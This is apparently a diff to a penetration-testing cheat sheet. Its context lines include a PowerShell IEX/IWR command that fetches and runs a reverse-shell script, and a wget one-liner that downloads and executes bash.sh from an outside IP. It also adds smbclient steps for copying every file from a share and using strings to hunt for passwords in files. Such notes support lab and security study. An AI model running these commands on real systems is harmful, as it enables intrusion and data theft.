@@ -182,6 +182,12 @@ IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-
 2. List shares: ``` smbclient -L \\{IP}\ -N ```
 3. Connect to share ``` smbclient \\\\{IP}\\{share} -U '{domain}\{username}%{password}' ```
 ## Get/Download all files
+```
+  mask""
+  recurse ON
+  prompt OFF
+  mget *
+```
 
 ## setuserinfo
 - modify user ac info
@@ -207,3 +213,7 @@ IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-
 ### Oneliner 
 - ``` wget 192.168.45.176/bash.sh -O /tmp/bash.sh && chmod +x /tmp/bash.sh && /tmp/bash.sh  ```
 
+# Handling multimedia
+- e.g. pdf
+- ``` file {file} ```
+- ``` strings {file} ``` check useful/hidden info e.g. username password etc. 
